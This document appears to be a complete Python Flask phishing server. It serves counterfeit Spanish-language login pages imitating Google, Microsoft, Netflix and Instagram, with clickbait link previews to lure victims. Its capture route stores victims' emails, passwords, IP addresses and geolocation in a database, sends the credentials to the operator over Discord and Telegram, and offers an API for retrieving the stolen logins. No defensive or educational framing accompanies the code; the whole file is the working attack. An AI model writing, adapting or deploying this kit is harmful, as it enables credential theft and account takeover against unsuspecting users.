#!/usr/bin/env python3
import os
from flask import Flask, request, render_template_string, redirect, jsonify, abort
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import sqlite3
import json
import requests
import hashlib
from datetime import datetime

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32)

# Rate limiting
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

# Config
CONFIG = {
    'webhook_discord': None,
    'webhook_telegram_token': None,
    'webhook_telegram_chat': None,
    'redirect_url': 'https://www.google.com',
    'template': 'google'
}

def load_config():
    try:
        with open('config.json', 'r') as f:
            CONFIG.update(json.load(f))
    except:
        pass

def init_db():
    conn = sqlite3.connect('credentials.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            ip TEXT,
            username TEXT,
            password TEXT,
            user_agent TEXT,
            referer TEXT,
            geo_location TEXT,
            hash TEXT UNIQUE,
            viewed INTEGER DEFAULT 0
        )
    ''')
    conn.commit()
    conn.close()

def get_client_info():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in str(ip):
        ip = ip.split(',')[0].strip()
    return ip

def get_geo_data(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp", timeout=3)
        data = response.json()
        if data.get('status') == 'success':
            return {
                'country': data.get('country', 'Unknown'),
                'city': data.get('city', 'Unknown'),
                'isp': data.get('isp', 'Unknown'),
                'location': f"{data.get('city', 'Unknown')}, {data.get('country', 'Unknown')}"
            }
    except:
        pass
    return {'country': 'Unknown', 'city': 'Unknown', 'isp': 'Unknown', 'location': 'Unknown'}

def get_template(template_name='google'):
    templates = {
        'google': '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="😲 Fuertes declaraciones de Messi" />
    <meta property="og:description" content="Me dijeron que ganaría" />
    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png" />
    <meta name="twitter:card" content="summary_large_image" />
    <title>Iniciar sesión - Google</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
        body { background: #fff; display: flex; flex-direction: column; min-height: 100vh; }
        .header { padding: 24px; }
        .header img { height: 24px; }
        .container { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .form-box { width: 100%; max-width: 450px; padding: 48px 40px; border: 1px solid #dadce0; border-radius: 8px; }
        .logo { text-align: center; margin-bottom: 24px; }
        h1 { text-align: center; color: #202124; font-size: 24px; font-weight: 400; margin-bottom: 24px; }
        input { width: 100%; padding: 13px 15px; margin-bottom: 16px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
        input:focus { outline: none; border-color: #1a73e8; }
        button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
        button:hover { background: #1557b0; }
        .forgot { color: #1a73e8; font-size: 14px; text-decoration: none; display: block; margin: 16px 0; }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
    </div>
    <div class="container">
        <div class="form-box">
            <div class="logo">
                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" width="75">
            </div>
            <h1>Iniciar sesión</h1>
            <form action="/capture" method="POST">
                <input type="email" name="email" placeholder="Correo electrónico" required>
                <input type="password" name="password" placeholder="Contraseña" required>
                <a href="#" class="forgot">¿Olvidaste la contraseña?</a>
                <button type="submit">Siguiente</button>
            </form>
        </div>
    </div>
</body>
</html>''',
        
        'microsoft': '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .container { background: white; width: 100%; max-width: 440px; padding: 44px; box-shadow: 0 4px 20px rgba(0,0,0,0.15); }
        .logo { width: 108px; margin-bottom: 16px; }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 12px; color: #1b1b1b; }
        input { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ccc; font-size: 15px; }
        button { width: 100%; padding: 12px; background: #0067b8; color: white; border: none; font-size: 15px; cursor: pointer; }
        button:hover { background: #005a9e; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="logo">
        <h1>Iniciar sesión</h1>
        <form action="/capture" method="POST">
            <input type="email" name="email" placeholder="Correo, teléfono o Skype" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
    </div>
</body>
</html>''',
        
        'netflix': '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', sans-serif; }
        body { background: #141414; min-height: 100vh; display: flex; flex-direction: column; }
        .header { padding: 24px 48px; }
        .logo { color: #e50914; font-size: 28px; font-weight: bold; }
        .container { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .form-box { background: rgba(0,0,0,0.75); padding: 60px 68px; width: 100%; max-width: 450px; border-radius: 4px; }
        h1 { color: white; font-size: 32px; margin-bottom: 28px; font-weight: 700; }
        input { width: 100%; padding: 16px; margin-bottom: 16px; background: #333; border: none; border-radius: 4px; color: white; font-size: 16px; }
        button { width: 100%; padding: 16px; background: #e50914; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 24px; }
        button:hover { background: #f40612; }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">NETFLIX</div>
    </div>
    <div class="container">
        <div class="form-box">
            <h1>Iniciar sesión</h1>
            <form action="/capture" method="POST">
                <input type="email" name="email" placeholder="Email" required>
                <input type="password" name="password" placeholder="Contraseña" required>
                <button type="submit">Iniciar sesión</button>
            </form>
        </div>
    </div>
</body>
</html>''',
        
        'instagram': '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
        body { background: #fafafa; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding-top: 40px; }
        .container { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; margin-bottom: 10px; }
        .logo { font-size: 40px; font-family: 'Brush Script MT', cursive; margin-bottom: 30px; }
        input { width: 100%; padding: 9px; margin-bottom: 6px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 14px; }
        button { width: 100%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 12px; }
        button:hover { background: #0081d6; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <form action="/capture" method="POST">
            <input type="text" name="email" placeholder="Teléfono, usuario o correo" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
    </div>
</body>
</html>'''
    }
    return templates.get(template_name, templates['google'])

def send_notifications(data):
    # Discord
    if CONFIG.get('webhook_discord'):
        try:
            embed = {
                "title": "🎯 Nueva Captura",
                "color": 0x00ff00,
                "fields": [
                    {"name": "📍 IP", "value": data['ip'], "inline": True},
                    {"name": "🌍 Ubicación", "value": data['geo']['location'], "inline": True},
                    {"name": "👤 Usuario", "value": data['username'], "inline": False},
                    {"name": "🔑 Pass", "value": data['password'][:20] + "...", "inline": False},
                ]
            }
            requests.post(CONFIG['webhook_discord'], json={"embeds": [embed]}, timeout=5)
        except:
            pass
    
    # Telegram
    if CONFIG.get('webhook_telegram_token') and CONFIG.get('webhook_telegram_chat'):
        try:
            msg = f"🎯 Nueva Captura\n📍 IP: {data['ip']}\n🌍 {data['geo']['location']}\n👤 {data['username']}\n🔑 {data['password'][:30]}"
            url = f"https://api.telegram.org/bot{CONFIG['webhook_telegram_token']}/sendMessage"
            requests.post(url, json={"chat_id": CONFIG['webhook_telegram_chat'], "text": msg}, timeout=5)
        except:
            pass

@app.route('/')
@limiter.limit("10 per minute")
def index():
    template = CONFIG.get('template', 'google')
    return render_template_string(get_template(template))

@app.route('/capture', methods=['POST'])
@limiter.limit("5 per minute")
def capture():
    ip = get_client_info()
    geo = get_geo_data(ip)
    
    username = request.form.get('email') or request.form.get('username', '')
    password = request.form.get('password', '')
    hash_str = hashlib.md5(f"{ip}:{username}:{password}".encode()).hexdigest()
    
    data = {
        'timestamp': datetime.now().isoformat(),
        'ip': ip,
        'username': username,
        'password': password,
        'user_agent': request.headers.get('User-Agent', ''),
        'referer': request.headers.get('Referer', ''),
        'geo': geo,
        'hash': hash_str
    }
    
    # Save to DB
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR IGNORE INTO credentials (timestamp, ip, username, password, user_agent, referer, geo_location, hash)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (data['timestamp'], data['ip'], data['username'], data['password'],
              data['user_agent'], data['referer'], geo['location'], hash_str))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"DB Error: {e}")
    
    send_notifications(data)
    return redirect(CONFIG.get('redirect_url', 'https://www.google.com'))

@app.route('/api/credentials')
@limiter.limit("30 per hour")
def api_credentials():
    auth_key = request.headers.get('X-API-Key')
    if auth_key != 'your-secret-key-here':
        abort(401)
    
    conn = sqlite3.connect('credentials.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM credentials ORDER BY id DESC')
    rows = cursor.fetchall()
    cursor.execute('UPDATE credentials SET viewed = 1 WHERE viewed = 0')
    conn.commit()
    conn.close()
    
    return jsonify([{
        'id': r[0], 'timestamp': r[1], 'ip': r[2], 'username': r[3],
        'password': r[4], 'location': r[7], 'viewed': r[9]
    } for r in rows])

@app.route('/health')
def health():
    return jsonify({'status': 'ok'})

if __name__ == '__main__':
    load_config()
    init_db()
    port = int(os.environ.get('PORT', 8080))
    print(f"[+] Servidor iniciado en puerto {port}")
    app.run(host='0.0.0.0', port=port, debug=False)
